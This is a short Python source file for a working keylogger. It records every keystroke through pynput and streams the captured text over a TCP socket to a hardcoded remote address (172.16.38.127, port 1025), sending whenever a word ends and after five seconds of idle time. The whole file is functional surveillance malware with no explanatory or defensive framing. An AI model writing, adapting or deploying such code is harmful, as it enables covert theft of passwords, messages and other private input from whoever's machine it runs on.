import pynput
from pynput.keyboard import Key,Listener
import socket  
import time
count = 0
keys = []
press_time=-1
def write_file(keys):
    with open("op.txt",'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            # if k.find("space")>0:
            #     f.write('\n')
            # elif k.find("Key") == -1:
            #     f.write(k)
            # f.write(k)
            s.send(k.encode())
            # f.write(str(key))
        
def on_press(key):
    global keys,count,press_time
    press_time=time.time()
    # print('pressed')
    if key==Key.shift:
        key=''
    if(key==Key.space or key==Key.enter or key==Key.esc):
        if(len(keys)>0):
            keys.append(' ')
        keys.append(key)
        keys.append('\n')
        write_file(keys)
        key=''
        keys=[]
    if(key==Key.backspace):
        keys.pop()
        key=''
    if('Key' in str(key)):
        # key= str(key).split('.')[1]
        keys.append(key)
        key=' '
    if('<' in str(key) ):
        key=int(str(key).split('<')[1].split('>')[0])-96
    keys.append(key)        
    
def on_release(key):
    if key == Key.esc:
        return False
    
# with Listener(on_press = on_press,on_release = on_release) as listener:
#     listener.join()


    
s = socket.socket()        
 
# Define the port on which you want to connect
port = 1025             
 
# connect to the server on local computer
s.connect(('172.16.38.127', port))

   
listener = Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

# print(time.time())

while True:
    if time.time()-press_time>5 and len(keys)>0:
        # print(press_time)
        write_file(keys)
        keys=[] 
    if len(keys)>0 and keys[0]==Key.esc:
        break
s.close()